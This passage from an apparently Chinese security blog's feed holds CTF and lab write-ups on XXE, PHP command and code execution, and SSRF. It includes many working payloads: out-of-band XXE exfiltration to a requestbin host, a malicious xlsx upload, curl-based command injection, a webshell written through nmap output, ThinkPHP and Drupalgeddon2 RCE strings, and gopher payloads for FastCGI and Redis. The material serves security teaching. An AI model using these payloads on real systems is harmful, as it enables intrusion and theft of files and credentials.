通过注入外部实体。尝试插入外部地址的外部实体，观察是否有请求。 XXE漏洞利用方式XXE漏洞利用方式分类一般XEE利用分两大情景： 有回显： 描述：可直接在页面中看到payload的执行结果。 思路：直接利用进行敏感文件获取等操作，直接输出结果。 无回显（blindxee）： 描述：看不到payload的执行结果。 思路：可通过外带使用外带数据通道提取数据 有回显-读取文件/SSRF/Phar此点可等效于参数可控的file_get_contents 读取文件 12345678&lt;?xmlversion="1.0"?&gt;&lt;!DOCTYPE a[ &lt;!ENTITY b SYSTEM "file:///etc/passwd"&gt; ]&gt;&lt;root&gt; &lt;username&gt;&amp;a;&lt;/username&gt; &lt;password&gt;&amp;b;&lt;/password&gt;&lt;/root&gt; SSRF 12345678&lt;?xmlversion="1.0"?&gt;&lt;!DOCTYPE a[ &lt;!ENTITY b SYSTEM "http://127.0.0.1/xxe.php"&gt; ]&gt;&lt;root&gt; &lt;username&gt;&amp;a;&lt;/username&gt; &lt;password&gt;&amp;b;&lt;/password&gt;&lt;/root&gt; Phar触发反序列化 12345678&lt;?xmlversion="1.0"?&gt;&lt;!DOCTYPE a[ &lt;!ENTITY b SYSTEM "phar://phar.phar/test.txt"&gt; ]&gt;&lt;root&gt; &lt;username&gt;&amp;a;&lt;/username&gt; &lt;password&gt;&amp;b;&lt;/password&gt;&lt;/root&gt; 无回显-读取文件/SSRF/Phar将数据外带到外部服务器上 读取文件 12345678&lt;?xmlversion="1.0"?&gt;&lt;!DOCTYPE a[ &lt;!ENTITY b SYSTEM "http://127.0.0.1/text.dtd"&gt; ]&gt;&lt;root&gt; &lt;username&gt;&amp;a;&lt;/username&gt; &lt;password&gt;&amp;b;&lt;/password&gt;&lt;/root&gt; text.dtd内容 12&lt;!ENTITY % file SYSTEM "php://filter/read=convert.base64-encode/resource=file:///flag"&gt;&lt;!ENTITY % int "&lt;!ENTITY &amp;#x25; send SYSTEM 'http://http.requestbin.buuoj.cn/umc930um？p=%file;'&gt;"&gt; XXE漏洞防御方式如何防御？ 推荐：使用开发语言提供的禁用外部实体的方法 PHP：libxml_disable_entity_loader(true); Java:DocumentBuilderFactorydbf=DocumentBuilderFactory.newInstance();dbf.setExpandEntityReferences(false); 不推荐：过滤用户提交的XML数据关键词：&lt;!DOCTYPE和&lt;!ENTITY或者SYSTEM和PUBLIC XXE实战有回显http://10.20.25.44:180/ xxe 读取/flag123456&lt;?xml version="1.0" encoding="utf-8" ?&gt;&lt;!DOCTYPE XXE[ &lt;!ENTITY XXE SYSTEM "file:///flag" &gt;]&gt;&lt;root&gt; &lt;name&gt;&amp;XXE;&lt;/name&gt;&lt;/root&gt; http://10.20.25.44:180/flag.php 读一下 flag.php php://filter/convert.base64-encode/resource=flag.php 这里不能直接访问所以需要base64编码绕过 123456&lt;?xml version="1.0" encoding="utf-8" ?&gt;&lt;!DOCTYPE XXE[ &lt;!ENTITY XXE SYSTEM "php://filter/convert.base64-encode/resource=flag.php" &gt;]&gt;&lt;root&gt; &lt;name&gt;&amp;XXE;&lt;/name&gt;&lt;/root&gt; 无回显XML外部实体注入http://10.20.25.44:181/ 读 /flag xxe 无回显原理为你要想办法查看你读取到的文件内容，但没有回显。要想办法获取读取到的文件，这时需要想办法向外发送一个网络请求，请求中则带上该文件的内容，接收到该请求则可以拿到文件内容。 REQUEST平台：http://http.requestbin.buuoj.cn/ 在没有回显的情况下，把信息发到外面的服务器 去上面的REQUEST平台生成链接 所以首先定义一个file实体，填入链接： 12&lt;!ENTITY % file SYSTEM "php://filter/read=convert.base64-encode/resource=file:///flag"&gt;&lt;!ENTITY % int "&lt;!ENTITY &amp;#x25; send SYSTEM 'http://http.requestbin.buuoj.cn/umc930um？p=%file;'&gt;"&gt; 作用是被目标服务器的 XML 解析器解析而后读取文件和拼接到实体参数里外发请求。 python -m SimpleHTTPServer 8081开启8081的web服务器 开启外部服务器，把test.dtd放到根目录下 构造payload： 12345678&lt;?xml version="1.0" encoding="utf-8" ?&gt;&lt;!DOCTYPE dasctf[ &lt;!ENTITY % remote SYSTEM "http://10.14.0.81/test.dtd" &gt; %remote;%int;%send;]&gt;&lt;books&gt; &lt;name&gt;abc&lt;/name&gt;&lt;/books&gt; 开头处定义首先引入上面我们的 dtd 文件，%remote 使其中的内容被解析且定义，再调用 %int 使得 %send 被定义，%send 被定义之后即可被调用，最后调用 %send 外发请求。ip是本地地址 然后post这个payload ，报错会回显flag： 1&lt;!ENTITY % file SYSTEM "php://filter/read=convert.base64-encode/resource=file:///flag"&gt; 同时flag也会发给REQUEST平台。 poi-ooxml-3.10 XXE 漏洞http://10.20.25.44:1180/ 拿到 flag 提示： 路径穿越下载 Java 源码。 &lt;http://10.20.25.44:1180/DownloadServlet?filename=../../../web.xml&gt; &lt;http://10.20.25.44:1180/DownloadServlet?filename=../../../classes/cn/abc/servlet/ListFileServlet.class&gt; &lt;http://10.20.25.44:1180/DownloadServlet?filename=../../../classes/cn/abc/servlet/DownloadServlet.class&gt; &lt;http://10.20.25.44:1180/DownloadServlet?filename=../../../classes/cn/abc/servlet/UploadServlet.class&gt; JD-GUI 审计代码 查看依赖库存在的 XXE 漏洞上传文件触发 XXE 漏洞读取到 flag 随便上出传一个文件，找到下载地址：&lt;http://10.20.25.44:1180/DownloadServlet?filename=29b475f2-dc80-4985-840d-11844edab662_a.sh&gt; 尝试路径穿越下载java代码，读取下来之后，用 jd-cli 去分析。 看到里面对 excel- 开头的 xlsx 文件单独处理，有用到 poi-ooxml-3.10 这个库。 搜索其中可能存在漏洞。找到存在 xxe 漏洞。 那么来先把本地的dtd文件 test3.dtd 构造好。 1&lt;!ENTITY % all "&lt;!ENTITY send SYSTEM 'http://http.requestbin.buuoj.cn/10s0ntp1?a=%file;'&gt;"&gt; 服务器打开来对外发送这个文件。 1php -S 0.0.0.0:8887 -t ./ 之后就可以构造一个恶意的 excel 传送上去。首先创建并解压一个 xlsx。 修改 [Content_Types].xml，将其中的内容改为引入外部实体读取并外带文件内容的 XXE Payload。 12345678&lt;?xml version="1.0" encoding="UTF-8" standalone="yes"?&gt;&lt;!DOCTYPE ANY[&lt;!ENTITY % file SYSTEM "file:///flag"&gt;&lt;!ENTITY % remote SYSTEM "http://10.14.0.20:8887/test3.dtd"&gt;%remote;%all;]&gt;&lt;root&gt;&amp;send;&lt;/root&gt; 保存好重新压缩,命令是： 1zip -r ../excel-exp.xlsx ./ 传上去，即可接收到 /flag 的内容： REQUEST平台也收到了请求：]]></content>
      <categories>
        <category>渗透测试</category>
      </categories>
      <tags>
        <tag>Web</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[PHP命令执行漏洞]]></title>
    <url>%2F%2F2020%2F08%2Fcb4d799d.html</url>
    <content type="text"><![CDATA[命令执行漏洞命令执行漏洞是指程序提供了直接执行 Shell 命令的函数的场景，当攻击者不合理使用，且开发者对用户参数未考虑安全因素的话，就会执行恶意的命令调用，被攻击者利用。 漏洞成因在编写PHP代码的过程中经常会有一些额外的需求，比如调用一个在系统中已经存在的命令，这时就需要调用一些函数来执行这些命令。 当这些代码中的参数可控的时候，恶意用户就可以插入自己想要执行的代码/命令，这些代码被执行之后就造成了漏洞。 命令字符串 → 生效命令 PHP中造成命令执行漏洞的常用函数 1.string system(string $command[,int &amp;$return_var]) 函数执行command参数所指定的命令，并且输出执行结果。 2.string exec(string $command[,array &amp;$output[,int &amp;$return_var]]) exec()执行command参数所指定的命令。 3.string shell_exec(string $cmd) 通过shell环境执行命令，并且将完整的输出以字符串的方式返回。 4.void passthru(string $command[,int &amp;$return_var]) 执行外部程序并且显示原始输出。 5.反引号 例如ls，反引号的内容会被当做系统命令执行，其中内部就是执行了 shell_exec() 函数进行处理。 6.void pcntl_exec(string $path[,array $args[,array $envs]]) pcntl是php的多进程处理扩展，在处理大量任务的情况下会使用到，pcntl需要额外安装。$path为可执行程序路径(/bin/bash)。$args表示传递给$path程序的参数。例如pcntl_exec(“/bin/bash&quot;,array(&quot;whoami&quot;));PHP中造成命令执行漏洞的常用函数 7.resource popen(string $command,string $mode) 打开一个指向进程的管道，该进程由派生给定的command命令执行而产生。例如popen(&#39;whoami&gt;&gt;123.txt&#39;,&#39;r&#39;); 8.resource proc_open(string $cmd,array $descriptorspec,array &amp;$pipes[, string$cwd[,array $env[, array $other_options]]]) 执行一个命令，并且打开用来输入/输出的文件指针。类似popen()函数，但是proc_open()提供了更加强大的控制程序执行的能力。 命令执行实战Exec command命令执行题目：http://10.20.25.44:284/ 审计代码，找到命令执行点，拿到根目录下的flag。 代码审计看见exec.php很可疑 1234567891011121314151617181920212223242526272829303132333435363738&lt;?phprequire 'library/MainFunction.php';echo '&lt;link href="//cdn.bootcss.com/bootstrap/3.3.5/css/bootstrap.min.css" rel="stylesheet"&gt;';echo '&lt;link rel="stylesheet" href="assets/style.css"&gt;';echo '&lt;div class="contentBox"&gt;';set_time_limit(0);$c = _GET('command', 'unknow');if ($c == 'unknow') &#123; echo ''; exit;&#125;$handle = popen($c, "r");if (ob_get_level() == 0) &#123; ob_start();&#125;while (!feof($handle)) &#123; $buffer = fgets($handle); $buffer = trim(htmlspecialchars($buffer)); echo $buffer . "&lt;br /&gt;"; echo str_pad('', 4096); ob_flush(); flush(); sleep(0.001);&#125;pclose($handle);ob_end_flush();echo '&lt;/div&gt;'; $c = _GET(&#39;command&#39;, &#39;unknow&#39;);解释： 使用command命令执行获取flag： Exec 拼接 命令执行题目：http://10.20.25.44:285/ 审计代码，找到命令执行点，拿到根目录下的 flag。 审计代码： Find In Path搜索 exec 目录在：/source/pack/127.0.0.1/download.php 1exec('tar zxvf work/'.$dir.'/'.$cert.'.zip -C work/'.$dir); 发现dir是由site和id拼接的，所以可以命令执行： 因为没有回显，所以要把cat的内容放到根目录下的flag.txt中方便查看，payload： 1http://10.20.25.44:285/source/pack/127.0.0.1/download.php?site=1&amp;id=;cat /ffffffflllllaaaaaaggggggg &gt; /var/www/html/flag.txt cat /然后访问: 得到flag: Phtml 命令执行BUUCTF 上 Web 分类的 [⽹鼎杯 2020 朱雀组]Nmap 打开，发现是一个扫描器。 尝试扫描一下： 测试一下，发现 ‘ 127.0.0.1 ‘ 的效果和 127.0.0.1 一样。 猜测此处存在命令注入，则可以测试能不能注入 &amp;&amp; 符号，但似乎并不能行。&amp;符号推测被屏蔽了。 1' 127.0.0.1 &amp;&amp; curl http://http.requestbin.buuoj.cn/vfpc9rvf &amp;&amp; ' 题目名字为 nmap，命令的返回格式也为 nmap，则思考是否能从 nmap 本身参数入手。查询一下 nmap 的参数。 https://nmap.org/man/zh/man-output.html 有这些参数可以输出文件，那我们尝试用这些参数来输出文件试试。尝试写出一个 dasctf.a。 1' aa -oN dasctf.a ' 访问 /dasctf.a，写出成功。 再来尝试写一个 php 试试，发现会被拦截，测试发现是 php 这个词被屏蔽了。 1' &lt;?php eval($_GET[a]);?&gt; -oN dasctf.php ' 搜索了解到在 Apache 服务器中，phtml 也会被当成 php 处理，咱们可尝试输出phtml (-oN dasctf.phtml)看看不会会被解析。 同时对于咱们要写出的内容，同样里面有 php 也会被屏蔽，所以咱们需要使用短标签(&lt;?=eval($_GET[a]);?&gt;)来尝试绕过。 1' &lt;?=eval($_GET[a]);?&gt; -oN dasctf.phtml ' 打上去，带上参数访问 dasctf.phtml，就会发现该文件被当成 php 解析，并且我们输入的参数被成功执行了。 那么就可以拿 flag 了。]]></content>
      <categories>
        <category>渗透测试</category>
      </categories>
      <tags>
        <tag>Web</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[PHP代码执行漏洞]]></title>
    <url>%2F%2F2020%2F08%2F68937ff4.html</url>
    <content type="text"><![CDATA[PHP代码执行漏洞在开发中经常需要能灵活地插入一些代码，并且使这些代码生效，例如： 系统主题模板的调用 灵活地逻辑判断 当这些代码中的参数可控的时候，恶意用户就可以插入自己想要执行的代码/命令，这些代码被执行之后就造成了漏洞。 1$_GET['a']($_POST[_]); PHP中造成代码执行漏洞的常用函数eval与assert1.mixed eval( string $code)把字符串code作为PHP代码执行。 代码不能包含打开/关闭PHPtags。比如不能传入：&#39;&lt;?phpecho&quot;Hi!&quot;;?&gt;&#39;。但仍然可以用合适的PHPtag来离开、重新进入PHP模式。比如&#39;echo&quot;InPHPmode!&quot;;?&gt;InHTMLmode!&lt;?phpecho&quot;BackinPHPmode!&quot;;&#39;。 传入的必须是有效的PHP代码。所有的语句必须以分号结尾。比如&#39;echo&quot;Hi!&quot;&#39;会导致一个parseerror，而&#39;echo&quot;Hi!&quot;;&#39;则会正常运行。 2.bool assert (mixed $assertion [,string $description] )PHP语言中是用来判断一个表达式是否成立，返回trueorfalse。 如果assertion是字符串，它将会被assert()当做PHP代码来执行。 调用函数过滤不当call_user_func()、call_user_func_array()、array_map()等几十个函数都可以调用其他函数的功能。其中一个参数为调用的函数名，如果这个传入的函数名可控，那就可以调用意外的函数来执行我们想执行的代码。 1.mixedcall_user_func(callable$callback[,mixed$parameter[,mixed$...]])第一个参数callback是被调用的回调函数，其余参数是回调函数的参数。 该类函数的功能是调用函数，多用在框架中动态调用函数。所以一些小的程序出现这种方式的代码执行会很少。 2.arrayarray_map(callable$callback,array$array1[,array$...])返回数组，是为array1每个元素应用callback函数之后的数组。callback函数形参的数量和传给array_map()数组数量，两者必须一样。 动态函数执行由于PHP的特性原因，PHP的函数名称可以由字符串进行拼接 12$a='a'.'s'.'s'.'e'.'r'.'t’;$a('phpinfo()'); 1$_GET['a']($_POST[_]); 基于该类写法变形出来的各种异性，经常被当作Web后门使用 代码执行拼接思路eval12&lt;?phpeval("var_dump('a' === '$_GET[abc]');"); 调回显出来： 123&lt;?phpvar_dump("var_dump('a' === '$_GET[abc]');");eval("var_dump('a' === '$_GET[abc]');"); 这里还是类比SQL注入时候的拼接思路：既要符合语法，还要能够执行。 &#39;);phpinfo();//);然后用&#39;);把前面语句闭合执行中间的phpinfo,最后用//注释掉后面的语句。 assert1234&lt;?phpvar_dump(&quot;&apos;a&apos; === &apos;$_GET[abc]&apos;&quot;);assert(&quot;&apos;a&apos; === &apos;$_GET[abc]&apos;&quot;);echo &quot;continue&quot;; http://127.0.0.1:8891/a.php?abc=&#39;.phpinfo().&#39; 拼接效果：&#39;&#39;a&#39; === &#39;&#39;.phpinfo().&#39;&#39;&#39; 代码执行实战phpunit_eval 代码执行http://10.20.25.44:283/ 代码审计发现敏感函数：eval(&#39;?&gt;&#39;.fille_get_contents(&#39;php://input&#39;)); 找到文件路径：http://10.20.25.44:283/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php 代码执行，打印根目录： 查看flag: thinkphp 5.0.20 远程代码执行漏洞2018年12月10日，ThinkPHP 官方发布《ThinkPHP 5.* 版本安全更新》，修复了一个远程代码执行漏洞。由于 ThinkPHP 框架对控制器名没有进行足够的检测,导致攻击者可能可以实现远程代码执行。 题目：http://10.20.25.44:280 转载：https://blog.knownsec.com/2018/12/thinkphp5-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E4%BA%8B%E4%BB%B6%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/ payload： 1s=index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=id 访问：http://10.20.25.44:280/?s=index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=id 显示id说明可以远程代码执行： 修改payload 先ls /显示根目录 看到fffffflllllaaaaaggggg，cat一下： Drupal Drupalgeddon 2 远程代码执行漏洞（CVE-2018-7600）2018年3月28日，Drupal官方发布新补丁和安全公告，宣称Drupal 6,7,8等多个子版本存在远程代码执行漏洞，攻击者可以利用Drupal网站漏洞，执行恶意代码，导致网站被完全控制。 详见： https://blog.csdn.net/qq_43622442/article/details/105689178 https://blog.csdn.net/limb0/article/details/107122919 题目：http://10.20.25.44:286/CMS：drupal-8.5.0 /user/register?element_parents=account/mail/%23value&amp;ajax_form=1&amp;_wrapper_format=drupal_ajax HTTP/ payload:form_id=user_register_form&amp;_drupal_ajax=1&amp;mail[#post_render][]=system&amp;mail[#type]=markup&amp;mail[#markup]=id 执行ls / 得到flag:]]></content>
      <categories>
        <category>渗透测试</category>
      </categories>
      <tags>
        <tag>Web</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[SSRF服务端请求伪造攻击]]></title>
    <url>%2F%2F2020%2F08%2Fce4db0e6.html</url>
    <content type="text"><![CDATA[SSRF服务端请求伪造攻击什么是SSRF服务端请求伪造攻击（Server-sideRequestForgery）简称SSRF，当WEB应用提供了从其他服务器获取数据的功能，但没有对远程服务器地址和远程服务器返回的信息进行合理的验证和过滤，就可能存在这种服务端请求伪造。 SSRF漏洞可以做什么 可以扫描内部网络，获得端口、服务信息 1234?url=192.168.32.158:22http://10.20.65.13/?url=10.20.65.13:22?url=127.0.0.1:3306 对内网Web应用进行指纹识别，通过访问默认文件实现 对内部任意主机和任意端口发送精心构造的请求包进行攻击 (struts2、SQL注入) 利用file协议读取本地文件 1view-source：192.168.32.158：:8080/?url=file:///etc/passwd 越过网络防火墙 SSRF漏洞探测能够对外发起网络请求的地方，就可能存在SSRF 从远程服务器请求资源 (图片代下载) 转码服务 在线翻译 未公开的api实现以及其他调用URL的功能 数据库内置功能 Webmail收取其他邮箱邮件 (pop3,imap,smtp) 文件处理，编码处理，属性处理 (xmlrpc.xml) SSRF漏洞利用SSRF有关的函数PHP: 12341.file_get_contents()2.fsockopen()3.curl_exec()4.fopen() Python: urllib 库http头注入 requests等库中默认跟随30x跳转 SSRF常见利用–file://协议使用file协议读取源码敏感文件，配合fuzz字典，信息搜集 1view-source：192.168.32.158：:8080/1.php?url=file:///etc/passwd SSRF常见利用–dict://协议使用dict://协议刺探内网端口信息 SSRF常见利用–Gopher://协议 Gopher拓展攻击面： Gopher协议是HTTP协议出现之前，在Internet上常见且常用的一个协议。当然现在Gopher协议已经慢慢淡出历史。 Gopher协议可以做很多事情，特别是在SSRF中可以发挥很多重要的作用。利用此协议可以攻击内网的FTP、Telnet、Redis、Memcache，也可以进行GET、POST请求。这无疑极大拓宽了SSRF的攻击面。 SSRF+REDIS写入WEBSHEEL自动化神奇利用生成payloadhttps://github.com/tarunkant/Gopherus SSRF常见利用-urllib头注入攻击内网Redis SSRF常见利用-30x跳转利用http状态码30x来探测端口、服务 配合burp，即可快速探测。注意二次编码问题，理论上来讲，穿过几层就编码几次 常见中转脚本： 12&lt;?php header("Location:".$_GET["url"]);?&gt;&lt;?php header("Location:".$_GET['schema']."://".$_GET['host'].":".$_GET['port']."/".$_GET["url"]);?&gt; SSRF漏洞绕过SSRF常见绕过-短地址利用各大短地址生成平台，生成短的地址，绕过长度限制 SSRF常见绕过 -xip.ioxip.io是一个公开的DNS解析站，是一个由SamStephenson所提供的免费DNS转址，xip.io用于提供内网DNS解析，许多的套件都利用xip.io来做内网解析，如MAMP，功能就是将***.127.0.0.1.xip.io解析成127.0.0.1。 123410.0.0.1.xip.io resolvesto 10.0.0.1www.10.0.0.1.xip.io resolvesto 10.0.0.1mysite.10.0.0.1.xip.io resolvesto 10.0.0.1foo.bar.10.0.0.1.xip.io resolvesto 10.0.0.1 SSRF常见绕过-IP格式绕过十进制转换八进制转换十六进制转换不同进制组合转换 12345数字地址(十进制)：127.0.0.1-&gt;2130706433十六进制：127.0.0.1-&gt;0x7F000001或0x7F.00.00.01或0x7F.0x00.0x00.0x01八进制：127.0.0.1-&gt;0177.0.0.1或0177.00.00.01省略写法：127.0.0.1-&gt;127.1如127.0.0.1：http://localhost/ SSRF常见绕过-协议绕过当url协议限定只为http(s)时，可以利用followredirect特性构造302跳转服务file://localhost/etc/passwd在某些java环境下，file:///etc/passwd?1.jpg也是可以读取到 SSRF进阶利用-logDnslog没有办法获取回显的情况下，使用dnslog来获取回显无疑是个好办法 httplog使用http日志也可以方便的定位到存在ssrf的位置，以及ip等详细信息 SSRF进阶利用-time盲注的灵感:其实不只在sql注入和命令执行中有时间盲注，ssrf也有，端口开放不开放产生的时间延迟说不定也有规律可寻 SSRF进阶利用-dns rebinding 差异化导致的问题不同的语言和库对url的识别不用，也会导致问题的产生。 SSRF实战 一句话总结：让你的目标代替你去进行操作 探测内网题目： 可以探测外网：http://10.20.25.44/?url=https://www.qq.com 探测内网c段：http://10.20.25.44/?url=file:///etc/hosts 1234567891011121314&lt;?phphighlight_file(__FILE__);if(isset($_GET['url'])) &#123; $ch = curl_init(); curl_setopt($ch, CURLOPT_URL, $_GET['url']); curl_setopt($ch, CURLOPT_HEADER, false); curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1); //如果把这行注释掉的话，就会直接输出 $result=curl_exec($ch); curl_close($ch); echo($result);&#125;127.0.0.1 localhost ::1 localhost ip6-localhost ip6-loopback fe00::0 ip6-localnet ff00::0 ip6-mcastprefix ff02::1 ip6-allnodes ff02::2 ip6-allrouters 172.17.0.2 1efb3a2d4c9e 尝试访问http://10.20.25.44/?url=172.17.0.3 1234567891011121314&lt;?phphighlight_file(__FILE__);if(isset($_GET['url'])) &#123; $ch = curl_init(); curl_setopt($ch, CURLOPT_URL, $_GET['url']); curl_setopt($ch, CURLOPT_HEADER, false); curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1); //如果把这行注释掉的话，就会直接输出 $result=curl_exec($ch); curl_close($ch); echo($result);&#125;flag&#123;ssrf1_37863789u82&#125; gopherus –exploit redis 本质是在你发送的命令前执行 auth &lt;密码&gt; 命令通过服务器的密码验证，从而继续执行后面的命令。 项目地址：https://github.com/Beipy/BeipyVideoResolution 题目：http://10.20.25.44:82/ SSRF 打 redis, redis 密码 root 审计代码，看到 data/title.php 中有 SSRF 点，且为 curl，可以请求 gopher://。 所以使用gopherus生成payload，注意参数： 进行解码： 因为redis需要密码登录，所以我们需要修改payload 加入密码root 回到scripts/目录下，编辑Redis.py 注意要改的是下面shell的，不是上面反弹shell的 加入下面的： 123456789*2\r$4\rauth\r$4\rroot\r\r 是回车*2 表示增加两个参数$4 表示占四个字节 本质是在你发送的命令前执行 auth &lt;密码&gt; 命令通过服务器的密码验证，从而继续执行后面的命令。 注意改的时候一定记得字节长度要匹配： 重新生成payload： 再编码一次： 上传payload： 访问：http://10.20.25.44:82/wfbww.php 然后加上：/wfbww.php?a=system(&#39;cat /flag&#39;);就可以得到flag 要不要编码要看content type 是urlencoded就已经自动解码过了，所以要再编一次 get会自动解码一次所以要再编码一次 gopherus –exploit fastcgihttp://10.20.25.44:84/ 打 php-fpm 首先访问http://10.20.25.44:91/?url=gopher://127.0.0.1/9000发现在加载，说明开启了相应端口 用工具生成payload: 1gopher://127.0.0.1:9000/_%01%01%00%01%00%08%00%00%00%01%00%00%00%00%00%00%01%04%00%01%01%04%04%00%0F%10SERVER_SOFTWAREgo%20/%20fcgiclient%20%0B%09REMOTE_ADDR127.0.0.1%0F%08SERVER_PROTOCOLHTTP/1.1%0E%02CONTENT_LENGTH56%0E%04REQUEST_METHODPOST%09KPHP_VALUEallow_url_include%20%3D%20On%0Adisable_functions%20%3D%20%0Aauto_prepend_file%20%3D%20php%3A//input%0F%17SCRIPT_FILENAME/var/www/html/index.php%0D%01DOCUMENT_ROOT/%00%00%00%00%01%04%00%01%00%00%00%00%01%05%00%01%008%04%00%3C%3Fphp%20system%28%27ls%20/%27%29%3Bdie%28%27-----Made-by-SpyD3r-----%0A%27%29%3B%3F%3E%00%00%00%00 因为是GET形式会自动解码一次所以要去url编码得到: 1%67%6f%70%68%65%72%3a%2f%2f%31%32%37%2e%30%2e%30%2e%31%3a%39%30%30%30%2f%5f%25%30%31%25%30%31%25%30%30%25%30%31%25%30%30%25%30%38%25%30%30%25%30%30%25%30%30%25%30%31%25%30%30%25%30%30%25%30%30%25%30%30%25%30%30%25%30%30%25%30%31%25%30%34%25%30%30%25%30%31%25%30%31%25%30%34%25%30%34%25%30%30%25%30%46%25%31%30%53%45%52%56%45%52%5f%53%4f%46%54%57%41%52%45%67%6f%25%32%30%2f%25%32%30%66%63%67%69%63%6c%69%65%6e%74%25%32%30%25%30%42%25%30%39%52%45%4d%4f%54%45%5f%41%44%44%52%31%32%37%2e%30%2e%30%2e%31%25%30%46%25%30%38%53%45%52%56%45%52%5f%50%52%4f%54%4f%43%4f%4c%48%54%54%50%2f%31%2e%31%25%30%45%25%30%32%43%4f%4e%54%45%4e%54%5f%4c%45%4e%47%54%48%35%36%25%30%45%25%30%34%52%45%51%55%45%53%54%5f%4d%45%54%48%4f%44%50%4f%53%54%25%30%39%4b%50%48%50%5f%56%41%4c%55%45%61%6c%6c%6f%77%5f%75%72%6c%5f%69%6e%63%6c%75%64%65%25%32%30%25%33%44%25%32%30%4f%6e%25%30%41%64%69%73%61%62%6c%65%5f%66%75%6e%63%74%69%6f%6e%73%25%32%30%25%33%44%25%32%30%25%30%41%61%75%74%6f%5f%70%72%65%70%65%6e%64%5f%66%69%6c%65%25%32%30%25%33%44%25%32%30%70%68%70%25%33%41%2f%2f%69%6e%70%75%74%25%30%46%25%31%37%53%43%52%49%50%54%5f%46%49%4c%45%4e%41%4d%45%2f%76%61%72%2f%77%77%77%2f%68%74%6d%6c%2f%69%6e%64%65%78%2e%70%68%70%25%30%44%25%30%31%44%4f%43%55%4d%45%4e%54%5f%52%4f%4f%54%2f%25%30%30%25%30%30%25%30%30%25%30%30%25%30%31%25%30%34%25%30%30%25%30%31%25%30%30%25%30%30%25%30%30%25%30%30%25%30%31%25%30%35%25%30%30%25%30%31%25%30%30%38%25%30%34%25%30%30%25%33%43%25%33%46%70%68%70%25%32%30%73%79%73%74%65%6d%25%32%38%25%32%37%6c%73%25%32%30%2f%25%32%37%25%32%39%25%33%42%64%69%65%25%32%38%25%32%37%2d%2d%2d%2d%2d%4d%61%64%65%2d%62%79%2d%53%70%79%44%33%72%2d%2d%2d%2d%2d%25%30%41%25%32%37%25%32%39%25%33%42%25%33%46%25%33%45%25%30%30%25%30%30%25%30%30%25%30%30 上传payload: 发现执行了ls /命令，根目录下有ffffffffffllllllllaaagggggg文件 重新生成cat /ffffffffffllllllllaaagggggg命令的payload并再次URL编码： 上传payload得到flag: 类似题目：https://www.cnblogs.com/zaqzzz/p/11975948.html DNS重定向http://das.wetolink.com:45080/ 拿到 flag 提示：DNS 重绑定 ceye.io 分析代码： 12345678910111213141516171819202122&lt;?php// /flag.phpif(isset($_GET['url'])) &#123; $result = parse_url($_GET['url']); if($result['scheme'] !== 'http' &amp;&amp; $result['scheme'] !== 'https') &#123; die('scheme!'); &#125; $ip = gethostbyname($result['host']); if(!filter_var($ip, FILTER_VALIDATE_IP, FILTER_FLAG_NO_PRIV_RANGE | FILTER_FLAG_NO_RES_RANGE)) &#123; die('ip!'); &#125; if($ip === "127.0.0.1" || $ip === "0.0.0.0") &#123; die('ip!'); &#125; echo file_get_contents($_GET['url']);&#125; else &#123; highlight_file(__FILE__);&#125; 获取 url 参数，进行解析，解析之后判断协议是否为 http 和 https，再继续获取域名中的host 进行解析，判断解析之后的 ip 是否不为内网 ip，不为内网 ip 再继续往下利用 file_get_contents 发出请求。此处存在有限制的 SSRF 点。 看到开头有 flag.php，则我们可以尝试访问，告诉我们需要从 127.0.0.1 也就是本地访问才行。 所以要想办法通过前面的 SSRF 点访问到 127.0.0.1 的/flag.php 才能获得flag。有解析判断ip，那如何绕过呢？就可以用到之前学习的 DNS 重绑定了，让其第一次返回内网地址之外的地址，正式请求时再次解析再解析到127.0.0.1，即可请求道 127.0.0.1 的 /flag.php。 这里使用 ceye.io 的 DNS 重绑定域名来完成。打开 ceye.io，看到 profile，设置 DNS rebinding。 记录下自己的域名，比如 qcqi7p.ceye.io，则 dns rebinding 的域名就是 r.qcqi7p.ceye.io。 发出请求进行尝试: http://das.wetolink.com:45080/?url=http://r.qcqi7p.ceye.io/flag.php有时要多试几次，因为 DNS rebinding 是随机返回的，要拼一下运气。多试几次即可拿到 flag。 Dns Rebinding的使用http://ceye.io/ 基本原理为目标 SSRF 点需要先验证输入的 url 里的 host 解析是否不为某些地址（例如内网地址），不为这些地址则继续请求，但之后正式请求时会重新解析一遍，这次解析到的就是另外一个地址，导致最终请求到的就是另外一个地址。 例：有一个域名，开了 dns rebinding 功能，设置返回 223.5.5.5 和 127.0.0.1 验证时解析该域名返回 223.5.5.5，通过。 正式请求时该域名解析返回的则是 127.0.0.1。]]></content>
      <categories>
        <category>渗透测试</category>
      </categories>
      <tags>
        <tag>Web</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[CSRF跨站请求伪造攻击]]></title>
    <url>%2F%2F2020%2F08%2Fecd34c17.html</url>
